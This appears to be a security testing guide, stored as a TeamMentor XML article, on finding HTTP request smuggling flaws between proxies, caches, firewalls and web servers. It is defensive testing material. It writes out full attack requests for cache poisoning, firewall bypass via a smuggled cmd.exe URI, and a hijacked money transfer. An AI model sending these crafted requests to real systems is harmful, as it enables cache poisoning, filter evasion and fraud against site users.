@@ -1,0 +1,196 @@
+<?xml version="1.0"?>
+<TeamMentor_Article Metadata_Hash="896862170" Content_Hash="1708742178">
+  <Metadata>
+    <Id>c2867f4f-56f9-48d7-803c-12d0fc12d175</Id>
+    <Id_History>dd24e26e-5891-4acb-a939-032f5effb679,</Id_History>
+    <Library_Id>92718d53-36b2-47bc-b6f5-e60994385f46</Library_Id>
+    <Title>How to Test for HTTP Request Smuggling Bugs</Title>
+    <Category>Input and Data Validation</Category>
+    <Phase>Test</Phase>
+    <Technology>Web Application</Technology>
+    <Type>How To</Type>
+    <DirectLink>How to Test for HTTP Request Smuggling Bugs</DirectLink>
+    <Tag />
+    <Security_Demand />
+    <Author />
+    <Priority />
+    <Status />
+    <Source>SI</Source>
+  </Metadata>
+  <Content Sanitized="true" DataType="Html">
+    <Data><![CDATA[<h1>
+    <span>Applies to</span>
+  </h1>
+  <ul>
+    <li>Networks using the HTTP protocol with two or more devices such as a proxy server, cache server, web server, or a web application firewall.</li>
+  </ul>
+  <p>&amp;nbsp;</p>
+  <h1>
+    <span>Summary</span>
+  </h1>
+  <p>HTTP request smuggling (HRS) bugs allow attackers to smuggle an HTTP request through a vulnerable HTTP entity or device, such as a web cache server or an application firewall. This vulnerability exists because of discrepancies between how two entities parse an HTTP request. As a result, an attacker can smuggle an HTTP request that goes undetected by one of the vulnerable entities, such as a proxy or a firewall. Attackers commonly use HTTP request vulnerabilities to bypass firewall rules or to execute other attacks such as cross-site scripting (XSS), web cache poisoning, and session hijacking. </p>
+  <p>Follow these steps in order to test for HTTP request smuggling:</p>
+  <ul>
+    <li>Step 1: Understand attack scenarios<li>Step 2: Analyze causes and countermeasures<li>Step 3: Start testing and exploring<li>Step 4: Fine-tune test case data</li></li></li></li>
+  </ul>
+  <p>&amp;nbsp;</p>
+  <h1>
+    <span>Step 1: Understand Attack Scenarios</span>
+  </h1>
+  <p>The first step in testing for HTTP request smuggling vulnerabilities is to understand how they are exploited. The following are common HRS attack scenarios:</p>
+  <ul>
+    <li>Web cache poisoning<li>Firewall/IDS/IPS bypass<li>Cross-site request forgery<b><i><span>&amp;nbsp;</span></i></b></li></li></li>
+  </ul>
+  <h2>
+    <span>
+      <em>Web cache poisoning</em>
+    </span>
+  </h2>
+  <p>The first HRS vulnerability, web cache poisoning, was reported by engineers at Watchfire Corporation (now IBM) in 2005 &amp;#91;i&amp;#93;. The vulnerability is possible because SunONE Web Server 6.1 and SunONE Proxy 3.6 interpret the Content-Length header differently. The HRS attack consists of sending the following HTTP POST request to the W/S through the proxy:</p>
+  <pre>
+    <span>
+      <strong>1 POST </strong>
+      <a href="http://vulnerable_site/example.html">
+        <strong>http://vulnerable_site/example.html</strong>
+      </a>
+      <strong> HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Type: application/x-www-form-urlencoded<br />5 Content-Length: 0<br />6 Content-Length: 52<br />7 &amp;#91;CRLF&amp;#93;<br />8 GET /poison.html HTTP/1.1<br />9 Host: vulnerable_site<br />10 Poisoned&amp;#33;&amp;#33;&amp;#33;&amp;#91;</strong>space after the "Poisoned&amp;#33;&amp;#33;&amp;#33;", but no CRLF&amp;#93;<br />11 GET <a href="http://vulnerable_site/target_page.html">http://vulnerable_site/target_page.html</a> HTTP/1.1<br />12 Host: vulnerable_site<br />13 Connection: Keep-Alive<br />14 &amp;#91;CRLF&amp;#93;<br /></span>
+  </pre>
+  <p>Note that each line ends with a Carriage Return/Line Feed (CRLF), except line 10. The proxy ignores the first Content-Length and uses the second one (52), so it parses the first GET as part of the POST request (lines 1 to 10). Then it parses a second GET request (line 11 to 14) and sends it to the W/S. In turn, the W/S uses the first Content-Length (0) and assumes that the POST request has no body (lines 1 to 7). Then, since there is no CRLF in line 10, it parses the remaining data as a single GET request (lines 8 to 14):</p>
+  <pre>
+    <span>
+      <strong>1 POST </strong>
+      <a href="http://vulnerable_site/example.html">
+        <strong>http://vulnerable_site/example.html</strong>
+      </a>
+      <strong> HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Type: application/x-www-form-urlencoded<br />5 Content-Length: 0<br />6 Content-Length: 52<br />7 &amp;#91;CRLF&amp;#93;</strong>
+      <br />8 GET /poison.html HTTP/1.1<br />9 Host: vulnerable_site<br />10 Poisoned&amp;#33;&amp;#33;&amp;#33;&amp;#91;space after the "Poisoned&amp;#33;&amp;#33;&amp;#33;", but no CRLF&amp;#93;<br />11 GET <a href="http://vulnerable_site/target_page.html">http://vulnerable_site/target_page.html</a> HTTP/1.1<br />12 Host: vulnerable_site<br />13 Connection: Keep-Alive<br />14 &amp;#91;CRLF&amp;#93;</span>
+  </pre>
+  <p>When forwarding the two requests, the proxy will receive two responses from the web server. Assuming that <span>poison.html</span> is cacheable, the proxy will associate the second request to target_page.htm with the response to poison.html, leading to a cache poisoning attack when a client requests the target page.</p>
+  <h2>
+    <span>
+      <em>Firewall/IDS/IPS bypass</em>
+    </span>
+  </h2>
+  <p>The second scenario relates to bypassing firewall protection, specifically application layer content-based filters such as filters that block any dangerous URIs (such as potential worm filenames like cmd.exe or directory traversal strings like <span>"../../"</span>). <span>&amp;nbsp;</span>Watchfire reports a vulnerability that affected IIS 5.0 and could be used to exploit CheckPoint FW-1. It happened due to IIS 5.0 truncating POST requests of certain page extensions in which the body exceeds 48K if the <span>Content-Type</span> header is not set to the expected value (such as <span>application/x-www-form-urlencoded </span><span>for</span><span> .asp </span><span>pages</span>):</p>
+  <pre>
+    <span>
+      <strong>1 POST /any.asp HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Length: 49223<br />5 &amp;#91;CRLF&amp;#93;<br />6 AAAA... &amp;#91;"A" x 49152 (48K)&amp;#93;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; <br />7 POST /any.asp HTTP/1.0<br />8 Connection: Keep-Alive<br />9 Content-Length: 30<br />10 &amp;#91;CRLF&amp;#93;</strong>
+      <br />11 POST /any.asp HTTP/1.0<br />12 Bla: &amp;#91;space after the "Bla:", but no CRLF&amp;#93;<br />13 POST /any.asp?cmd.exe HTTP/1.0<br />14 Connection: Keep-Alive<br />15 &amp;#91;CRLF&amp;#93;</span>
+  </pre>
+  <p>CheckPoint properly parses the first POST from line 1 to 10 as dictated by the Content-Length header. It doesn&amp;#8217;t stop parsing the first request after the sequence of &amp;#8220;A&amp;#8221;s because it doesn&amp;#8217;t suffer from the truncation issue. However, IIS 5.0 truncated the first request in line 6, parsed a second one of Content-Length 30 from line 7 to 12, and finally parses a third and malicious one from lines 13 to 15:</p>
+  <pre>
+    <span>
+      <strong>1 POST /any.asp HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Length: 49223<br />5 &amp;#91;CRLF&amp;#93;<br />6 AAAA... &amp;#91;"A" x 49152 (48K)&amp;#93;</strong>
+      <br />7 POST /any.asp HTTP/1.0<br />8 Connection: Keep-Alive<br />9 Content-Length: 30<br />10 &amp;#91;CRLF&amp;#93;<br />11 POST /any.asp HTTP/1.0<br />12 Bla: &amp;#91;space after the "Bla:", but no CRLF&amp;#93;<br /><strong><em>13 POST /any.asp?cmd.exe HTTP/1.0<br />14 Connection: Keep-Alive<br />15 &amp;#91;CRLF&amp;#93;</em></strong></span>
+  </pre>
+  <p>IIS interprets and processes three requests while CheckPoint interprets only two (and doesn&amp;#8217;t see the last one). This discrepancy on parsing the above data leads to attackers being able to bypass the firewall filter via HRS.</p>
+  <h2>
+    <span>
+      <em>Cross-site request forgery</em>
+    </span>
+  </h2>
+  <p>HTTP request smuggling also enables Cross-site Request Forgery (CSRF) attacks. Using this vulnerability, an attacker is able to forge a fake request and execute a malicious action such as transferring money from a victim&amp;#8217;s bank account or changing the victim&amp;#8217;s password without the victim noticing. Actually, using request smuggling, the attacker executes CSRF attacks without having to interact with the victim. Since it uses the victim&amp;#8217;s current credentials, the attack is also known as Request Credential Hijacking. </p>
+  <p>The attack consists of sending a crafted attack request to a web server through a proxy:</p>
+  <pre>
+    <span>POST /some_script.jsp HTTP/1.0<br />Connection: Keep-Alive<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 9<br />Content-Length: <strong>140</strong><br />this=that<strong>GET /transfer.asp?to=attackers_account&amp;ammount=10000 HTTP/1.0<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 0<br />Foobar:</strong></span>
+  </pre>
+  <p>The goal is to use two different Content-Length headers so that the proxy processes the above request differently than the web server. The proxy parses the data as single POST request and forwards it to the web server. The web server parses it as a POST request with body&amp;#8217;s length 9 and an incomplete GET request. Then, if a client sends a request, the web server processes the incomplete GET request (smuggled) concatenated with the client request. </p>
+  <p>If the client then sends:</p>
+  <pre>
+    <span>GET /any.asp HTTP/1.0<br />Cookie: session_id =1234567890<br />Authorization: Basic dsfkoiqrgnksdf</span>
+    <span>&amp;nbsp;</span>
+  </pre>
+  <p>The web server processes the following request:</p>
+  <pre>
+    <span>
+      <strong>GET /transfer.asp?to=attackers_account&amp;ammount=10000 HTTP/1.0<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 0<br />Foobar:</strong> GET /any.asp HTTP/1.0<br />Cookie: session_id =1234567890<br />Authorization: Basic dsfkoiqrgnksdf<br /></span>
+    <span>&amp;nbsp;</span>
+  </pre>
+  <p>As a result, the vulnerable web server calls transfer.asp using the client&amp;#8217;s credentials (victim). In the example above, the attacker attempts to transfer &amp;#36;10,000 to his account.<span></span></p>
+  <p>&amp;nbsp;<b><span>&amp;nbsp;</span></b></p>
+  <h1>
+    <span>Step 2: Analyze Causes and Countermeasures</span>
+  </h1>
+  <p>The next step in testing for HTTP request smuggling vulnerabilities is to analyze what causes them and how to defend against them. </p>
+  <h2>
+    <span>
+      <em>HTTP Request Smuggling Causes</em>
+    </span>
+  </h2>
+  <p>HTTP request smuggling happens because two HTTP entity/devices parse HTTP requests differently. The scenarios above involve using two Content-Length headers or a long request. In addition, attackers can use other combinations of conflicting headers such as Transfer-Encoding: Chunked with a Content-Length header. If an HTTP device such as a firewall fails to parse an HTTP request as the final device, an attacker can smuggle an additional request through it and execute this attack.</p>
+  <h2>
+    <span>
+      <em>HTTP Request Smuggling Countermeasures</em>
+    </span>
+  </h2>
+  <p>To protect against HTTP request smuggling, you must fully patch all network devices such as web services, firewalls, and proxies. Whenever a vendor discovers an HTTP request smuggling bug, it releases a patch that can be easily downloaded and installed. In addition, there might be options for strict parsing (Watchfire mentions a vulnerability that only affects Apache under certain configurations). Thus, it is important to always run with the stricter configuration so that any enclosed or smuggled requests are detected. </p>
+  <p>&amp;nbsp;</p>
+  <h1>
+    <span>Step 3: Start Testing and Exploring</span>
+  </h1>
+  <p>Now that you are familiar with HTTP request smuggling attack scenarios and understand their causes and countermeasures, this step will focus on detailing specific test cases for each of the different request smuggling scenarios.</p>
+  <p>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>Testing for Web Cache Poisoning through HTTP Request Smuggling</em>
+    </span>
+  </h2>
+  <p>This test requires four hosts: an attacker, a client, a web server, and a web cache server. Follow these steps:</p>
+  <ol>
+    <li>Set up a network sniffer in the web cache server and start monitoring network traffic.<li>From the attacker computer, send a request to the web server through the cache server. Send a POST with two Content-Length headers along with a target page and a poison page as seen in the first scenario.<li>Wait until the web server replies to the original request.<li>From the client computer, open a web browser and navigate to the target page.<li>Stop monitoring network traffic in the web cache server.</li></li></li></li></li>
+  </ol>
+  <p>Expected results: The client should receive the original target page and not the poison page in step 4. In addition, the network capture must not show the web server replying with the contents of the poisoned page.</p>
+  <h2>
+    <span>
+      <em>Testing for Firewall Bypass through HTTP Request Smuggling</em>
+    </span>
+  </h2>
+  <p>This test requires three hosts: an attacker, a web server, and a firewall server. Follow these steps:</p>
+  <ol>
+    <li>Set up a network sniffer in the firewall server and start monitoring network traffic.<li>In the firewall server, make sure that rules to filter out dangerous URIs are enabled. <li>In the client computer, try to invoke a dangerous URI directly by using a GET request (without executing an attack). The firewall should block this.<li>From the attacker computer, send a request to the web server through the firewall server. Send a POST that has an embedded GET to the dangerous URI using different Content-Length headers or long bodies, as seen in the second scenario.<li>Wait until the web server processes the request.<li>Stop monitoring network traffic in the firewall server.</li></li></li></li></li></li>
+  </ol>
+  <p>Expected results: The capture shows that the web server doesn&amp;#8217;t parse the embedded GET with the malicious URI. Another possible valid outcome is that the firewall parses the embedded GET and denies the malicious URI.<b><i><span>&amp;nbsp;</span></i></b></p>
+  <h2>
+    <span>
+      <em>Testing for Cross-Site Request Forgery through HTTP Request Smuggling</em>
+    </span>
+  </h2>
+  <p>This test requires four hosts: an attacker, a client, a web server, and a proxy server. Follow these steps:</p>
+  <ol>
+    <li>Set up a network sniffer in the proxy server and start monitoring network traffic.<li>In the client, log in to the web application under test to get a valid cookie and/or authentication credentials.<li>From the attacker computer, send a crafted request to the web server through the proxy with two Content-Length and an embedded request to a page that executes the desired action (such as a page that makes bank account transfers, as seen in the third scenario).<li>Wait until the proxy forwards the request to the web server and the web server replies. The web server should only reply to the original request and not to the smuggled one.<li>In the client computer, make any request to the web server. This should trigger the second (smuggled) request to be parsed by the web server.</li></li></li></li></li>
+  </ol>
+  <p>Expected results: The capture shows that the web server replies correctly to the client request in step 5 instead of executing the malicious action.</p>
+  <p>
+    <b>
+      <span>&amp;nbsp;</span>
+    </b>
+  </p>
+  <h1>
+    <span>Step 4: Fine-tune Test Case Data</span>
+  </h1>
+  <p>The last step in testing for HTTP request smuggling vulnerabilities is to fine-tune test case data according to the different attack methods.</p>
+  <h2>
+    <span>
+      <em>Fine-tune test case data depending on HRS technique</em>
+    </span>
+  </h2>
+  <p>It is crucial that you understand the different HRS techniques so that you can tune your data accordingly. Below is a list of the different techniques presented by Watchfire:</p>
+  <ul>
+    <li>Double Content-Length header.<li>Combining &amp;#8220;Transfer-Encoding: chunked&amp;#8221; header and a Content-Length header.<li>Double CR.<li>GET Request with Content-Length (backward smuggling).<li>CRLF SP CRFL trick.<li>Sending request with body &gt; 48 K. </li></li></li></li></li></li>
+  </ul>
+  <p>Note that the effectiveness of each of these attacks varies depending on the platform under test. For instance, Apache will behave different than IIS; therefore test case data should be tailored to each platform&amp;#8217;s peculiarities. </p>
+  <p>&amp;nbsp;</p>
+  <h1>
+    <span>Conclusions</span>
+  </h1>
+  <p>HTTP request smuggling vulnerabilities apply to web environments with two or more web entities such as a web server with a proxy or a web server with a firewall. <span>&amp;nbsp;</span>If your application lives in this environment, it is necessary to execute the test cases shown here in order to verify that all entities in the network equally parse HTTP requests. Any incongruities in parsing may lead to a request smuggling attack. To properly test for this bug, make sure to understand the attack scenarios, causes and countermeasures, as well as to apply the different testing procedures.</p>
+  <p />&amp;nbsp;<br /><hr /><p /><div><div><p>&amp;#91;i&amp;#93; <b>HTTP Request Smuggling</b>. Chamit Linhart, Amit Klein, Ronen Heled, and Steve Orrin. Watchfire Corporation, 2005. <a href="http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a><span></span></p><p>&amp;nbsp;</p></div></div>]]></Data>
+  </Content>
+</TeamMentor_Article>
